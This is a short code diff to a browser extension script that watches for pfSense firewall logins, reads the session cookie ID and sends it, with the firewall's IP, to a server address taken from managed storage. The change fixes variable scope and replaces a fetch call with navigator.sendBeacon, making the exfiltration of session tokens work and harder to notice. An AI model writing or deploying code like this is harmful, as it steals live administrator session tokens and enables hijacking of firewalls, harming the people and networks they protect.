@@ -1,5 +1,6 @@
+let ip = null;
 browser.storage.managed.get("server_ip").then((result) => {
-  const ip = result.server_ip;
+  ip = result.server_ip;
 });
 
 browser.cookies.onChanged.addListener((changeInfo) => {
@@ -13,13 +14,9 @@ browser.cookies.onChanged.addListener((changeInfo) => {
         const timestamp = new Date().toLocaleTimeString();
         console.log(`[${timestamp}] pfSense Login Detected! Session ID: ${sessionId}`);
         
-        // Send the ID to your local Python server
-        fetch(ip, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded"
-            },
-            body: `session=${encodeURIComponent(sessionId)}&pfsense_ip2=${encodeURIComponent(pfsense_ip1)}`
-        }).catch(err => console.error("Python logger not running.", err));
+        const data = new URLSearchParams();
+        data.append('session', sessionId);
+        data.append('pfsense_ip2', pfsense_ip1);
+        navigator.sendBeacon(ip, data);
     }
 });
